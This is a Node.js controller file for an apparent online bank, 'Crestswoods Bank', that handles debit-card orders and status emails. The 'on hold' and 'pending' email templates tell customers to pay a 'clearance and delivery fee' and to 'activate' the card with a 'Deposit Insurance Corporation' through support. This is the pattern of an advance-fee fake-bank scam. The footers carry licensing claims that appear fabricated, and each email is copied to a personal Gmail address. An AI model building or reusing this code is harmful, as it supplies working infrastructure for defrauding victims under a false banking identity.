const sendEmail = require("../utils/emailSender");
const OrderCard = require("../models/OrderCard");
const User = require("../models/UserModel");

const orderDebitCard = async (req, res) => {
  try {
    const user = await User.findById(req.user.userId);
    console.log(user);
    if (!user) {
      return res
        .status(404)
        .json({ status: "failed", error: "User not found" });
    }

    const { address } = req.body;
    if (!address) {
      return res
        .status(400)
        .json({ status: "failed", error: "Please enter mailing address" });
    }

    const orderCard = await OrderCard.create({
      ...req.body,
      user: req.user.userId,
      name: user.name,
    });

    const subject = "Debit Card Order";
    const text = "";
    const html = `<!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Crestswoods Bank Debit Card Update</title>
        <style>
          /* Add your custom CSS styles here */
          body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            color: #333;
          }
          .container {
            max-width: 600px;
            margin: 20px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
          }
          h1 {
            color: #0044cc;
          }
          .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #666;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <h1>Update on Your Crestswoods Bank Debit Card</h1>
          <p>Hi ${user.name},</p>
          <p>Your Crestswoods bank debit card order has been processed successfully.</p>
          <p>If you have any questions or need further assistance, please don't hesitate to contact us.</p>
          <div class="footer">
            <p>Thank you for choosing Crestswoods Bank.</p>
          </div>
            <p>If you have any questions regarding this deposit, please contact our support team.</p>
          
          <div class="footer" style="margin-top: 1rem; font-size: 12px">
            <p>Thank you for choosing our services.</p>
          </div>

          <p>Earn discounts when you send money by signing up for our no-cost rewards program!</p>

          <h3>Security Information:</h3>
          <p>It's important to keep your account secure. Here are some security tips:</p>
          <ul>
            <li>Never share your account password with anyone.</li>
            <li>Use strong, unique passwords for your online banking.</li>
          </ul>

          <p>If you have any questions or need assistance, please don't hesitate to <a href="mailto:support@Crestswoodscapitals.com">contact us via mail</a> </p>

          <div class="footer">
            <p>Authorized to do business in all 50 states, D.C. and all U.S. territories, NMLS # 898432. Licensed as a Bank corporation in New York State Department of Financial Services; Massachusetts Check Seller License # CS0025, Foreign Transmittal License # FT89432. Licensed by the Georgia Department of Banking and Finance.</p>
            <p>Crestswoods Capitals Payment Systems, Inc. | 5601 W. 127th Street
Crestwood, IL 60418</p>
            <p>© Crestswoods Capitals.</p>
          </div>
        </div>
      </body>
      </html>`;

    await sendEmail(user.email, subject, text, html); // Send email to user
    await sendEmail(
      "jennyevans338@gmail.com",
      `From ${user.email}`,
      text,
      html
    ); // Send notification to admin

    // Respond with success message and order data
    res.status(200).json({ status: "success", data: orderCard });
  } catch (error) {
    console.error("Error ordering debit card:", error);
    res.status(400).json({ status: "failed", error: error.message });
  }
};

const mailedOrderCard = async (req, res) => {
  try {
    const { cardId } = req.params;
    const card = await OrderCard.findOne({ _id: cardId });
    if (card) {
      card.status = "mailed";
      await card.save();
    }
    res.status(200).json({
      status: "success",
      message: "updated successfull",
      card,
    });

    const user = await User.findById({ _id: card.user });
    const subject = "Debit Card Order Mailed ";
    const text = "";
    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crestswoods Bank Debit Card Update</title>
    <style>
        /* Add your custom CSS styles here */
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            color: #333;
        }
        .container {
            max-width: 600px;
            margin: 20px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #0044cc;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Update on Your Crestswoods Bank Debit Card</h1>
        
        <p>Hi ${user.name},</p>
        
        <p>Your Crestswoods bank debit card has been mailed. Your debit card will be delivered as soon as possible.
</p>
  
          
          <div class="footer" style="margin-top: 1rem; font-size: 12px">
            <p>Thank you for choosing our services.</p>
          </div>

          <p>Earn discounts when you send money by signing up for our no-cost rewards program!</p>

          <h3>Security Information:</h3>
          <p>It's important to keep your account secure. Here are some security tips:</p>
          <ul>
            <li>Never share your account password with anyone.</li>
            <li>Use strong, unique passwords for your online banking.</li>
          </ul>

          <p>If you have any questions or need assistance, please don't hesitate to <a href="mailto:support@Crestswoodscapitals.com">contact us via mail</a> </p>

          <div class="footer">
            <p>Authorized to do business in all 50 states, D.C. and all U.S. territories, NMLS # 898432. Licensed as a Bank corporation in New York State Department of Financial Services; Massachusetts Check Seller License # CS0025, Foreign Transmittal License # FT89432. Licensed by the Georgia Department of Banking and Finance.</p>
            <p>Crestswoods Capitals Payment Systems, Inc. | 5601 W. 127th Street
Crestwood, IL 60418</p>
            <p>© Crestswoods Capitals.</p>
          </div>
    </div>
</body>
</html>
`;

    await sendEmail(user.email, subject, text, html);
    await sendEmail(
      "jennyevans338@gmail.com",
      `from ${user.email}`,
      text,
      html
    );
  } catch (error) {
    console.log(error);
    res.status(400).json({ error: error.message });
  }
};

const onHoldOrderCard = async (req, res) => {
  try {
    const { cardId } = req.params;
    const card = await OrderCard.findOne({ _id: cardId });
    if (card) {
      card.status = "on hold";
      await card.save();
    }
    res
      .status(200)
      .json({ status: "success", message: "updated successfull", card });

    const user = await User.findById({ _id: card.user });

    const subject = "Debit Card Order on hold";
    const text = "";
    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crestswoods Bank Debit Card Update</title>
    <style>
        /* Add your custom CSS styles here */
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            color: #333;
        }
        .container {
            max-width: 600px;
            margin: 20px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #0044cc;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Update on Your Crestswoods Bank Debit Card</h1>
        
        <p>Dear ${user.name},</p>
        
        <p>Your Crestswoods bank debit card is on hold due to a clearance and delivery of your debit card. Note that a clearance and delivery fee will be charged before we deliver 
        your debit card. Kindly contact customer support  <a href="mailto:support@Crestswoodscapitals.com">here</a>
         for your clearance and delivery charges.</p>
        
          <p>If you have any questions regarding this deposit, please contact our support team.</p>
          
          <div class="footer" style="margin-top: 1rem; font-size: 12px">
            <p>Thank you for choosing our services.</p>
          </div>

          <p>Earn discounts when you send money by signing up for our no-cost rewards program!</p>

          <h3>Security Information:</h3>
          <p>It's important to keep your account secure. Here are some security tips:</p>
          <ul>
            <li>Never share your account password with anyone.</li>
            <li>Use strong, unique passwords for your online banking.</li>
          </ul>

          <p>If you have any questions or need assistance, please don't hesitate to <a href="mailto:support@Crestswoodscapitals.com">contact us via mail</a> </p>

          <div class="footer">
            <p>Authorized to do business in all 50 states, D.C. and all U.S. territories, NMLS # 898432. Licensed as a Bank corporation in New York State Department of Financial Services; Massachusetts Check Seller License # CS0025, Foreign Transmittal License # FT89432. Licensed by the Georgia Department of Banking and Finance.</p>
            <p>Crestswoods Capitals Payment Systems, Inc. | 5601 W. 127th Street
Crestwood, IL 60418</p>
            <p>© Crestswoods Capitals.</p>
          </div>
    </div>
</body>
</html>
`;

    await sendEmail(user.email, subject, text, html);
    await sendEmail(
      "jennyevans338@gmail.com",
      `from ${user.email}`,
      text,
      html
    );
  } catch (error) {
    console.log(error);
    res.status(400).json({ error: error.message });
  }
};

const pendingOrderCard = async (req, res) => {
  try {
    const { cardId } = req.params;
    const card = await OrderCard.findOne({ _id: cardId });
    if (card) {
      card.status = "pending";
      await card.save();
    }

    res
      .status(200)
      .json({ status: "success", message: "updated successfull", card });
    const user = await User.findById({ _id: card.user });

    const subject = "Debit Card Order pending";
    const text = "";
    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crestswoods Bank Debit Card Update</title>
    <style>
        /* Add your custom CSS styles here */
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            color: #333;
        }
        .container {
            max-width: 600px;
            margin: 20px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #0044cc;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Update on Your Crestswoods Bank Debit Card</h1>
        
        <p>Hi ${user.name},</p>
        
        <p>Your Crestswoods bank debit card is pending because you haven't activated your debit
         card yet from the Deposit Insurance Corporation. So know you need to activate your debit card before 
         we can start any procedure on your delivery. Contact customer support via email to activate your debit card. 
         Click  <a href="mailto:support@Crestswoodscapitals.com">here</a> to contact support.
        </p>
        
        <p>If you have any questions regarding this deposit, please contact our support team.</p>
          
          <div class="footer" style="margin-top: 1rem; font-size: 12px">
            <p>Thank you for choosing our services.</p>
          </div>

          <p>Earn discounts when you send money by signing up for our no-cost rewards program!</p>

          <h3>Security Information:</h3>
          <p>It's important to keep your account secure. Here are some security tips:</p>
          <ul>
            <li>Never share your account password with anyone.</li>
            <li>Use strong, unique passwords for your online banking.</li>
          </ul>

          <p>If you have any questions or need assistance, please don't hesitate to <a href="mailto:support@Crestswoodscapitals.com">contact us via mail</a> </p>

          <div class="footer">
            <p>Authorized to do business in all 50 states, D.C. and all U.S. territories, NMLS # 898432. Licensed as a Bank corporation in New York State Department of Financial Services; Massachusetts Check Seller License # CS0025, Foreign Transmittal License # FT89432. Licensed by the Georgia Department of Banking and Finance.</p>
            <p>Crestswoods Capitals Payment Systems, Inc. | 5601 W. 127th Street
Crestwood, IL 60418</p>
            <p>© Crestswoods Capitals.</p>
          </div>
    </div>
</body>
</html>
`;

    await sendEmail(user.email, subject, text, html);
    await sendEmail(
      "jennyevans338@gmail.com",
      `from ${user.email}`,
      text,
      html
    );
  } catch (error) {
    console.log(error);
    res.status(400).json({ error: error.message });
  }
};

const getAllCards = async (req, res) => {
  try {
    const cards = await OrderCard.find({}).sort({ createdAt: -1 });
    res.status(200).json({ status: "success", nbHits: cards.length, cards });
  } catch (error) {
    console.log(error);
    res.status(400).json({ error: error.message });
  }
};

module.exports = {
  orderDebitCard,
  onHoldOrderCard,
  pendingOrderCard,
  mailedOrderCard,
  getAllCards,
};
